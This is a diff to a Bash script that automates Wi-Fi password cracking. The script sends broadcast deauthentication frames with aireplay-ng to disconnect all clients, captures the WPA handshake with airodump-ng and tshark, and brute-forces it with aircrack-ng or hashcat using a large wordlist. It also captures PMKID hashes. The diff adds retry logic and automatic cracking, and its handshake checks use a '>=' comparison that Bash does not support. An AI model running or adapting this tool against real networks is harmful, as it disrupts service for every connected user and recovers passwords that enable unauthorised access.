@@ -19,18 +19,18 @@ nc='\033[0m' # No Color
 echo ""
 
 function exit_script() {
-    echo -e "\n${red}[-]${nc} Taking network card to monitor mode..."
+    echo -e "\n${green}[-]${nc} Taking network card to monitor mode..."
     sleep 0.5
     airmon-ng stop ${network_card} &>/dev/null
     echo -e "${green}[+]${nc} Network card is now in managed mode."
     # restart network manager
-    echo -e "\n${red}[-]${nc} Restarting network manager..."
+    echo -e "\n${green}[-]${nc} Restarting network manager..."
     sleep 0.5
     service network-manager restart &>/dev/null
     service NetworkManager restart &>/dev/null
     service wpa_supplicant restart &>/dev/null
     echo -e "${green}[+]${nc} Network manager restarted."
-    echo -e "\n${red}[-]${nc} Exiting..."
+    echo -e "\n${green}[-]${nc} Exiting..."
     tput cnorm; exit 0
 }
 
@@ -67,7 +67,7 @@ function check_installer_manager(){
 }
 
 function install_hcxdumptool(){
-    echo -e "${red}[-]${nc} Installing hcxdumptool..."
+    echo -e "${green}[-]${nc} Installing hcxdumptool..."
     sleep 0.5
     if [[ $installer == "apt" ]]; then
         apt install -y libcurl4-openssl-dev libssl-dev pkg-config &>/dev/null
@@ -137,7 +137,7 @@ function handshake(){
     airodump_filter_xterm_pid=$!
 
     sleep 5; echo -e "${yellow}[*]${nc} Deauthenticating all clients..."
-    xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
+    xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
     aireplay_xterm_pid=$!
 
     sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
@@ -146,32 +146,52 @@ function handshake(){
 
     sleep 60 # Listen for 60 seconds
 
-    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
 
-    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
         echo -e "${green}[+]${nc} Handshake captured"
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
     else
         echo -e "${red}[-]${nc} Handshake could not be captured"
         echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
-        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
-        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
+        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
+        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
             echo -e "${green}[+]${nc} Handshake captured"
         else
             echo -e "${red}[-]${nc} Handshake could not be captured"
         fi
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
-        echo -ne "${yellow}[?]${nc} Do you want to try again? [y/n]: " && read answer
+        echo -ne "${purple}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
         if [[ $answer == "y" ]]; then
+            echo -e "${red}[-]${nc} The failed captures will be deleted"
+            rm -rf capture_*
+            handshake
+        fi
+        echo -ne "${purple}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
+
+        if [[ $answer == "y" ]]; then
+            echo -e "${red}[-]${nc} The failed captures will be deleted"
+            rm -rf capture_*
+            select_target_network
             handshake
         fi
     fi
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
+        mkdir -p handshakes
+        mv capture_* handshakes/
 
-    # rm -rf handshake.txt
-    mkdir -p handshakes
-    mv capture_* handshakes/
+        xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+        aircrack_xterm_pid=$!
+        echo -e "\n${yellow}[*]${nc} Cracking handshake..."
+        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
+        echo -e "${yellow}[!]${nc} sudo kill -9 $aircrack_xterm_pid"
+    else
+        echo -e "${red}[-]${nc} The failed captures will be deleted"
+        rm -rf capture_*
+    fi
 
-    xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+    rm -rf handshake.txt
 
 }
 
@@ -198,10 +218,13 @@ function pmkid(){
         echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
         sleep 1
         xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt" &
+        hashcat_xterm_pid=$!
+        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you finished"
+        echo -e "${yellow}[!]${nc} sudo kill -9 $hashcat_xterm_pid"
     else
         echo -e "\n${red}[!]${nc} The hashes are not captured :("
 
-        echo -ne "\n${purple}[?]${nc} Retry? (y/n): "; read option
+        echo -ne "\n${purple}[?]${nc} Do you want to retry? (y/n): "; read option
 
         if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
             echo -e "\n${yellow}[R]${nc} Retrying...\n"
